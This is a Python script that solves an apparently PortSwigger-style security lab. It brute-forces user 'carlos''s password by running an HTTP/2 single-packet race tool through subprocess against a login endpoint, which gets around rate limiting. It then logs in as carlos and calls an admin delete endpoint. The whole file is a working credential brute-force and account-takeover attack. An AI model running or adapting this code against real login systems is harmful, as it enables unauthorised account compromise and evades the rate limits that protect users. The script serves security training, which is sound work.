import requests
import re
import sys
import shlex
import subprocess
import pickle
import time


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.passwords = []
        self.carlos_password = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def read_passwords_file(self):
        with open('passwords.txt') as file:
            for line in file.readlines():
                self.passwords.append(line.strip())

    def split_passwords_into_files(self):
        passwords_1 = self.passwords[:15]
        passwords_2 = self.passwords[15:]

        with open('passwords_1.txt', 'w') as file:
            for password in passwords_1:
                file.write(password + '\n')

        with open('passwords_2.txt', 'w') as file:
            for password in passwords_2:
                file.write(password + '\n')

    def brute_force_carlos_password(self):
        hostname = self.lab_url.split('https://')[1].strip('/')
        csrf = self.get_csrf_token('login')
        cookie_header = 'Cookie: session={}'.format(self.session.cookies.get('session'))

        # https://github.com/ma4747gh/H2SinglePacketAttacker
        for i in range(2):
            command = ('python /home/ma4747gh/Desktop/GitHub/H2SinglePacketAttacker/h2_single_packet_attacker.py {} 443 '
                       '--tls_channel --streams 15 --path /login --data \'csrf={}&username=carlos&password=FUZZ\' --header '
                       '\'{}\' --method POST --variable_data_key FUZZ --word_list {} '
                       '--pickle responses').format(hostname, csrf, cookie_header, 'passwords_{}.txt'.format(str(i + 1)))
            args = shlex.split(command)
            print(subprocess.run(args).stdout)

            with open('responses.pkl', 'rb') as file:
                data = pickle.load(file)

            for stream_id, stream_value in data.items():
                if ':status 302' in stream_value['headers']:
                    self.carlos_password = stream_value['request_data'].decode().split('password=')[1]
                    break

            if self.carlos_password:
                break

        print(self.carlos_password)

    def sign_in_as_carlos(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'carlos',
            'password': self.carlos_password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def delete_carlos(self):
        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.read_passwords_file()
        self.split_passwords_into_files()
        self.brute_force_carlos_password()
        time.sleep(60)
        self.sign_in_as_carlos()
        self.delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
